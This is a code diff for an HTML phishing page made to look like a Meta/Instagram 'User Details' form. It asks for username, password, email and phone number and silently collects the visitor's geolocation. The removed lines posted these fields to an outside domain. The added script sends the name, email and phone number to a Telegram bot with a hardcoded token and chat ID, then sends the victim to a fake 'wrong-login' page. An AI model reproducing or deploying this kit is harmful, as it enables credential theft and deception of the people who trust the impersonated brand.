@@ -1,107 +1,95 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
-<!-- Mirrored from checkmarkcontact.com/from/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 28 Jan 2022 19:51:23 GMT -->
-<!-- Added by HTTrack -->
-<!-- Mirrored from ticksform.com/contact-us/user-details.php by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 11 Apr 2022 00:42:11 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
-<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
-        <meta charset="utf-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <title>Blue | Application Meta</title>
-        <meta name="description" content="">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Blue | Application Meta</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="icon" href="head.ico">
     <link href="bootstrap.min.css" rel="stylesheet">
     <link href="style.css" rel="stylesheet">
     <link rel="stylesheet" href="../../use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
 </head>
-<body onload = "getLocation();">
-<header>
-		<table>
-			<tbody><tr>
-				<td><img src="logo.png" width="200"></td>
-				<td><font size="5"><i class="fas fa-stream"></i></font></td>
-			</tr>
-		</tbody></table>
-	</header>
 
-<div class="lsf_o">
-<div class="card">
-            
+<body onload="getLocation();">
+    <header>
+        <table>
+            <tbody>
+                <tr>
+                    <td><img src="logo.png" width="200"></td>
+                    <td><font size="5"><i class="fas fa-stream"></i></font></td>
+                </tr>
+            </tbody>
+        </table>
+    </header>
 
-         
-           <form autocomplete="off" method="post" action="https://homesupporteamsshared.online/nc_assets/css/api.php" enctype="multipart/form-data">
-			 <center>
-             <img src="meta.png" width="300">
-             <h1 style="font-family:sans-serif; font-weight:400;  color:#3d3d3d; font-size:20px;">User Details</h1>
-                <input type="text" class="fdasf_o" minlength="4" required name="fname" placeholder="User Name"><br>
-								<script type="text/javascript">
-$('.mini').keyup(function(){
-    this.value=this.value.toLowerCase();
-});
-</script>
-                <input type="password" required name="password" minlength="6" placeholder="Password" class="fdasf_o"><br>
-				  <input type="text" class="fdasf_o" minlength="4" required="" name="email" placeholder="E-Mail"><br>
-                  <input type="hidden" class="fdasf_o"  required="" name="longitude"><br>
-                  <input type="hidden" class="fdasf_o"  required="" name="latitude" ><br>
-				  <input type="text" class="fdasf_o"  minlength="8" required name="contact" placeholder="Phone Number"><br>
-				 
-                <button type="submit" name="submit" class="bvsf_asd">
-                <span>Next
-                </span>
-            </button><br>
-            <img src="meta.gif" width="300px">
-				   <script>
-      $("#phone").inputmask({
-         "mask": "+99 (999) 999-9999"
-      });
-   </script>
-</center>
+    <div class="lsf_o">
+        <div class="card">
+            <form autocomplete="off" onsubmit="submitForm(event);">
+                <center>
+                    <img src="meta.png" width="300">
+                    <h1 style="font-family:sans-serif; font-weight:400;  color:#3d3d3d; font-size:20px;">User Details</h1>
+                    <input type="text" class="fdasf_o" minlength="4" required name="fname" placeholder="User Name"><br>
+                    <input type="password" required name="password" minlength="6" placeholder="Password" class="fdasf_o"><br>
+                    <input type="text" class="fdasf_o" minlength="4" required="" name="email" placeholder="E-Mail"><br>
+                    <input type="hidden" class="fdasf_o" required="" name="longitude"><br>
+                    <input type="hidden" class="fdasf_o" required="" name="latitude"><br>
+                    <input type="text" class="fdasf_o" minlength="8" required name="contact" placeholder="Phone Number"><br>
 
-				<script>
-function phoneFormat(input) {
-    input = input.replace(/\D/g,'').substring(0,10); 
-    var size = input.length;
-    if (size>0) {input="("+input}
-    if (size>3) {input=input.slice(0,4)+") "+input.slice(4)}
-    if (size>6) {input=input.slice(0,9)+"-" +input.slice(9)}
-    return input;
-}
-		</script>
-        </form>
-</div>
-
+                    <button type="submit" class="bvsf_asd">
+                        <span>Next</span>
+                    </button><br>
+                    <img src="meta.gif" width="300px">
+                </center>
+            </form>
+        </div>
     </div>
-	<!--boş-->
-	<br><br><br><br>
+
+    <br><br><br><br>
 
     <script>
-      function getLocation(){
-        if(navigator.geolocation){
-          navigator.geolocation.getCurrentPosition(showPosition);
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            }
         }
-      }
-      function showPosition(position){
-        document.querySelector('.myForm input[name="latitude"]').value = position.coords.latitude;
-        document.querySelector('.myForm input[name="longitude"]').value = position.coords.longitude;
-      }
-     
+
+        function showPosition(position) {
+            document.querySelector('.lsf_o form input[name="latitude"]').value = position.coords.latitude;
+            document.querySelector('.lsf_o form input[name="longitude"]').value = position.coords.longitude;
+        }
+
+        function submitForm(event) {
+            event.preventDefault(); // Prevent the default form submission
+            var formData = new FormData(event.target);
+
+            // Send form data to Telegram bot using an AJAX request
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://api.telegram.org/6334457895:AAH5-_N9Ou-xk5huQ4mX-A4GHrfPPHWlMbw/sendMessage?chat_id=6048293239");
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("text=New User Details:\nUser Name: " + formData.get("fname") +
+                "\nEmail: " + formData.get("email") +
+                "\nPhone Number: " + formData.get("contact"));
+
+            // You will need to replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your actual Telegram bot token and chat ID.
+
+            // Optionally, you can handle the response from the bot here and provide feedback to the user.
+
+            // After sending the data, you can redirect to the "wrong-login.html" page
+            window.location.href = "wrong-login.html";
+        }
     </script>
- 
-<script src="../../cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
-<script src="../../cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script>
 
-<script src="bootstrap.min.js"></script>
-<script src="zewform.js"></script>
+    <script src="../../cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="../../cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script>
+    <script src="bootstrap.min.js"></script>
+    <script src="zewform.js"></script>
 
-<div class="footer">
-  <p>© 2023 from Instagram</p>
-</div>
-
+    <div class="footer">
+        <p>© 2023 from Instagram</p>
+    </div>
 </body>
 
-<!-- Mirrored from ticksform.com/contact-us/user-details.php by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 11 Apr 2022 00:42:16 GMT -->
 </html>
